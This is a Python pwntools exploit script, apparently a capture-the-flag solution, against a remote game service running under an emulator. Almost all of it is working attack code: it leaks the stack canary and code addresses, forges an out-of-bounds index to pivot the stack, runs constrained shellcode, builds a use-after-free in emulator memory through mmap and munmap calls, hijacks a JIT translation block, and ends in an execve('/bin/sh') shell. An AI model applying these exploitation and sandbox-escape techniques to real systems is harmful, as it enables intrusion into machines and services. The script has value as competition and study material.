from pwn import *

context.arch = 'amd64'

def recvState():
    res = b''
    r.recv(1)
    while len(res)!=0x2b0:
        res+=r.recv(0x2b0-len(res))
    gameState = {'isConfront':u64(res[0x00:0x08]),
                 'unicornStage':u64(res[0x08:0x10]),
                 'unicornHP':u64(res[0x10:0x18]),
                 'unicornAttack':u64(res[0x18:0x20]),
                 'unicornDefense':u64(res[0x20:0x28]),
                 'unicornState':u64(res[0x28:0x30]),
                 'unicornAttribute':u64(res[0x30:0x38]),
                 'unicornCD':u64(res[0x38:0x40]),
                 'unicornDefenseGauge':u64(res[0x40:0x48]),
                 'unicornLoc':u64(res[0x48:0x50]),
                 'unicornAttackSourceLoc':u64(res[0x50:0x58]),
                 'unicornAttackBoxLoc':u64(res[0x58:0x60]),
                 'adventurerHP':u64(res[0x60:0x68]),
                 'adventurerAttack':u64(res[0x68:0x70]),
                 'adventurerDefense':u64(res[0x70:0x78]),
                 'adventurerState':u64(res[0x78:0x80]),
                 'adventurerCD':u64(res[0x80:0x88]),
                 'adventurerDefenseGauge':u64(res[0x88:0x90]),
                 'adventurerLoc':u64(res[0x90:0x98]),
                 'adventurerAttackSourceLoc':u64(res[0x98:0xa0]),
                 'adventurerAttackBoxLoc':u64(res[0xa0:0xa8]),
                 'adventurerWeaponIdx':u64(res[0xa8:0xb0]),
                 'adventurerName':res[0xb0:0x1b0],
                 'adventurerDesc':res[0x1b0:0x2b0]}
    return gameState

def start(namelen,desclen,name,desc):
    if type(name)==str:
        name = name.encode()
    if type(desc)==str:
        desc = desc.encode()
    payload = p64(1)+p64(namelen)+p64(desclen)+name+desc
    r.send(p32(len(payload)))
    r.send(payload)
    return recvState()

def disposeWeapon(idx,OOB_payload=None):
    payload = p64(6)+p64(idx)
    if OOB_payload is not None:
        if type(OOB_payload)==str:
            OOB_payload = OOB_payload.encode()
        r.send(p32(0x280))
        r.send((payload+OOB_payload).ljust(0x280,b'\x00'))
    else:
        r.send(p32(len(payload)))
        r.send(payload)
        return recvState()

def idle():
    payload = p64(0)
    r.send(p32(len(payload)))
    r.send(payload)
    return recvState()

###Addr
gameState_addr = 0x600000000000
gameStateWeapons_addr = gameState_addr+0x2b8
set_r10_offset = 0x21b
trampoline_offset = 0x52

###ROPgadget
syscall_gadget = 0xb8

###Exploit
r = remote('unicorn.balsnctf.com',10101)

idle()
gameState = start(0x100,0x100,'','')
canary = u64(gameState['adventurerDesc'][0xa8:0xb0])
stack_addr = u64(gameState['adventurerDesc'][0xb0:0xb8])-0xfc0
code_base = u64(gameState['adventurerDesc'][0xe0:0xe8])-0xabc+8 #skip the initial entry marker
print(hex(canary))
print(hex(stack_addr))
print(hex(code_base))

inputBuf_addr = stack_addr+0x1000-0x40-0x280
fakeIdx = (inputBuf_addr+0x18-gameStateWeapons_addr)//0x10+0x8000000000000000
fakeEntry = p64(0)+p64(0)+p64(inputBuf_addr-0x38)  #overwrite rbp and stack pivot
fake_rbp = inputBuf_addr+0x28
fake_r11_1 = inputBuf_addr+0x68
fake_r10_1 = inputBuf_addr+0x158
fake_r11_2 = inputBuf_addr+0xb8
fake_r10_2 = inputBuf_addr+0x1b8
fake_r11_3 = inputBuf_addr+0x108
fake_r10_3 = inputBuf_addr+0x218
#"stackFrame" is overlapped with "dispatcher" into "switch" to save space
#further overlap "fake_10" and "switch" to save more space
#stackFrame1 = p64(canary)+p64(inputBuf_addr+0x68)+p64(0)*4+p64(fake_r11_1-0x50)+p64(code_base+set_r10_offset)
#dispatcher1 = p64(canary)+p64(0)*6+p64(code_base+trampoline_offset)
switch1 = p64(canary)+p64(inputBuf_addr+0x38)+p64(canary)+p64(0)*3+p64(fake_r11_1-0x50)+p64(code_base+set_r10_offset)+p64(fake_r10_1-0x64)+p64(code_base+trampoline_offset)
switch2 = p64(canary)+p64(inputBuf_addr+0x88)+p64(canary)+p64(0)*3+p64(fake_r11_2-0x50)+p64(code_base+set_r10_offset)+p64(fake_r10_2-0x64)+p64(code_base+trampoline_offset)
switch3 = p64(canary)+p64(inputBuf_addr+0xd8)+p64(canary)+p64(0)*3+p64(fake_r11_3-0x50)+p64(code_base+set_r10_offset)+p64(fake_r10_3-0x64)+p64(code_base+trampoline_offset)
stackFrame4 = p64(canary)+p64(0)*6+p64(code_base-8)
sc1 = asm(f'''
           nop
           mov rax, {(code_base+syscall_gadget)>>24}
           shl rax, 4
           add rax, {((code_base+syscall_gadget)>>20)&0xf}
           shl rax, 4
           add rax, {((code_base+syscall_gadget)>>16)&0xf}
           shl rax, 4
           add rax, {((code_base+syscall_gadget)>>12)&0xf}
           shl rax, 4
           add rax, {((code_base+syscall_gadget)>>8)&0xf}
           shl rax, 4
           add rax, {((code_base+syscall_gadget)>>4)&0xf}
           shl rax, 4
           add rax, {(code_base+syscall_gadget)&0xf}
           push rax
           shr rax, 48
           push rax
           push rax
           push rax
           pop rdi
           pop rsi
           pop rdx
           pop r8
           add rsi, 0x1
           shl rsi, 13
           add rdx, 3
           add rax, 9
           add rbp, 8
           jmp r8
           ''').ljust(0x60,b'\x00')
sc2 = asm(f'''
           nop
           mov rax, {(code_base+syscall_gadget)>>24}
           shl rax, 4
           add rax, {((code_base+syscall_gadget)>>20)&0xf}
           shl rax, 4
           add rax, {((code_base+syscall_gadget)>>16)&0xf}
           shl rax, 4
           add rax, {((code_base+syscall_gadget)>>12)&0xf}
           shl rax, 4
           add rax, {((code_base+syscall_gadget)>>8)&0xf}
           shl rax, 4
           add rax, {((code_base+syscall_gadget)>>4)&0xf}
           shl rax, 4
           add rax, {(code_base+syscall_gadget)&0xf}
           push rax
           shr rax, 48
           push rax
           push rax
           pop rdi
           pop rsi
           pop r8
           add rdi, 0x1
           shl rdi, 12
           add rsi, 0x1
           shl rsi, 12
           add rax, 11
           add rbp, 8
           jmp r8
           ''').ljust(0x60,b'\x00')
sc3 = asm(f'''
           nop
           mov rax, {(code_base+syscall_gadget)>>24}
           shl rax, 4
           add rax, {((code_base+syscall_gadget)>>20)&0xf}
           shl rax, 4
           add rax, {((code_base+syscall_gadget)>>16)&0xf}
           shl rax, 4
           add rax, {((code_base+syscall_gadget)>>12)&0xf}
           shl rax, 4
           add rax, {((code_base+syscall_gadget)>>8)&0xf}
           shl rax, 4
           add rax, {((code_base+syscall_gadget)>>4)&0xf}
           shl rax, 4
           add rax, {(code_base+syscall_gadget)&0xf}
           push rax
           shr rax, 48
           push rax
           push rax
           push rax
           pop rdi
           pop rsi
           pop rdx
           pop r8
           add rdx, 1
           shl rdx, 10
           add rbp, 8
           jmp r8
           ''').ljust(0x60,b'\x00')
payload = fakeEntry+switch1+switch2+switch3+stackFrame4+sc1+sc2+sc3
disposeWeapon(fakeIdx,payload)
r.send(p64(fake_rbp))
#at this point, we have freed ourselves from the useable instruction set limit
'''
mov eax, 0x3b       ; nop
mov edi, "/sh\x00"  ; push rdi
mov edi, "/bin"     ; nop
shl rdi, 0x20       ; push rdi      ; push rsp
pop rdi             ; add rdi, 4    ; nop
xor esi, esi        ; xor edx, edx  ; syscall   ; hlt
'''
inject_sc = b'\xb8\x3b\x00\x00\x00\x90\xeb\x05'+\
            b'\xbf\x2f\x73\x68\x00\x57\xeb\x06'+\
            b'\xbf\x2f\x62\x69\x6e\x90\xeb\x06'+\
            b'\x48\xc1\xe7\x20\x57\x54\xeb\x06'+\
            b'\x5f\x48\x83\xc7\x04\x90\xeb\x06'+\
            b'\x31\xf6\x31\xd2\x0f\x05\xf4\x90'

free_sc = asm(f'''
               //The entire scheme is quite delicate and easily breaks with some minor modification

               //release the previously overlapping chunk, as it occupies the space we need for future mem hijack
               mov rdi, 0
               mov rsi, 0x1000
               mov rax, 11
               syscall

               //Prepare chunk for UAF, things start getting extremely complex here
               //and most likely wont work without complete replication of environment, proceed with care
               mov rdi, 0x800000000000
               mov rsi, 0x10000
               mov rdx, 3
               mov rax, 9
               syscall

               //craft shared host ptr for mmap UAF primitive later
               mov rdi, 0x60000
               mov rsi, 0x40000
               mov rdx, 3
               mov rax, 9
               syscall
               
               mov rdi, 0xa0000
               mov rsi, 0x40000
               mov rdx, 3
               mov rax, 9
               syscall

               mov rdi, 0xdf000
               mov rsi, 0x1000
               mov rax, 11
               syscall

               //3 chunks to allow fine-grained control over tcache later
               mov rdi, 0x100000
               mov rsi, 0x1000
               mov rdx, 3
               mov rax, 9
               syscall

               nop
               mov rdi, 0x101000
               mov rsi, 0x1000
               mov rdx, 3
               mov rax, 9
               syscall

               nop
               mov rdi, 0x102000
               mov rsi, 0x1000
               mov rdx, 3
               mov rax, 9
               syscall

               //Release UAF chunk here
               mov rdi, 0x800000000000
               mov rsi, 0x10000
               mov rax, 11
               syscall

               //release chunks to populate tcache
               //whether or not to free all chunks depends on ordering of the 2 MemoryRegionSection array
               //theoretically we can also do a cross array OOB, but that seems more unstable
               mov rdi, 0x100000
               mov rsi, 0x4000
               mov rax, 11
               syscall

               //serves as the victim to have PhysPageEntry hijacked
               //should be large enough to ensure access from reserved chunk into TranslationBlocks array
               mov rdi, 0x800000000000
               mov rsi, 0x3a000
               mov rdx, 3
               mov rax, 9
               syscall

               //reserve a chunk that lives right before tcg_ctx->tb_ctx.tbs (TranslationBlocks array)
               //and also shares same RAM address as the UAF chunk freed earlier
               //address is chosen that it will always be last block, this allows us to deduce its offset in section array more easily
               mov rdi, 0x800000
               mov rsi, 0xc000
               mov rdx, 3
               mov rax, 9
               syscall

               //This serves both to create mmap UAF + map "nodes" onto the dangling memory
               //Theorotically, this could be seperated into two steps
               //But since everything is fragile here, well just accept the result
               //And modify on demand when we migrate to other environments with different mappings
               mov rdi, 0x60000
               mov rsi, 0x40000
               mov rax, 11
               syscall

               mov rdi, 0xf00000000000
               mov rsi, 0x100000
               mov rdx, 3
               mov rax, 9
               syscall

               //Do a leak in the "nodes" array to ensure overlap succeeded
               //mov rdi, 1
               //mov rsi, {0xa0000+0x1f010}
               //mov rdx, 0x8
               //mov rax, 1
               //syscall

               //start overwriting all PhysPageEntry for the victim page
               //the count(rcx), and starting address(rdi) depends on previously mapped page vaddr & size
               //the target(rsi) depends on vaddr of the page right before TranslationBlocks array + how many mr are created in total
               //memo : what is done here is basically change
               //   node ptr for (0x800000000000,0x3a000)(idx 9)
               //   to the already freed mr at (0x800000000000,0x10000)(idx 13)
               //   while the original ram_addr of freed mr is claimed by (0x80000,0xc000)(idx?), which is located right before TranslationBlocks array
               //note that a more robust way to find above values is to walk the page table to find target, but currently too lazy to do that
               mov rcx, 0x3a
               mov rdi, {0xa0000+0x1f010+0x800*18}
               mov esi, {11<<6}
               HIJACK_LOOP:
                 test rcx, rcx
                 jz HIJACK_DONE
                 mov dword ptr [rdi], esi
                 add rdi, 4
                 dec rcx
                 jmp HIJACK_LOOP
               HIJACK_DONE:

               //Leak stuff!
               //The leak is from tcg_ctx->tb_ctx.tbs, which is basically an array of TranslationBlocks
               mov rdi, 1
               mov rsi, 0x80000000bfff
               mov rdx, 0x100
               mov rax, 1
               syscall

               //After leaking, there are generally two path to go
               //The first is to craft fake MemoryRegion objects on mmap pages, and utilize pointers inside those to perform voodoo
               //Second is smuggle shellcode into the JIT process, and change rip to the smuggled ptr
               //Since the second one seems significantly easier, I will resort to it

               //prepare shellcode to be JITTED
               mov rax, {u64(inject_sc[0x00:0x08])}
               mov rdi, {u64(inject_sc[0x08:0x10])}
               mov rsi, {u64(inject_sc[0x10:0x18])}
               mov rdx, {u64(inject_sc[0x18:0x20])}
               mov rcx, {u64(inject_sc[0x20:0x28])}
               mov rbx, {u64(inject_sc[0x28:0x30])}

               jmp FORCE_JIT
               FORCE_JIT:

               //hijack TB
               mov rdi, 0
               mov rsi, 0x80000000bfff
               mov rdx, 0x100
               mov rax, 0
               syscall

               //jump to hijacked TB
               mov rax, {code_base}
               jmp rax

               DEBUG:
                 push rax
                 mov rdi, 1
                 mov rsi, {code_base+0x2000}
                 mov rdx, 0x18
                 mov rax, 1
                 syscall

                 mov rdi, 0
                 mov rsi, {stack_addr}
                 mov rdx, 0x10
                 mov rax, 0
                 syscall

                 INFL:
                   jmp INFL
               ''')
r.send(free_sc)
leak = r.recv(0x100)
originalTB = leak[0x11:0x11+0x78]
JITpage = u64(originalTB[0x20:0x28])
print(hex(JITpage))
maliciousTB = originalTB[:0x20]+p64(JITpage+0x84ae) #This offset is highly volatile to payload
padding = b'\x00'*0x11
payload = padding+maliciousTB
r.send(payload)
r.interactive()

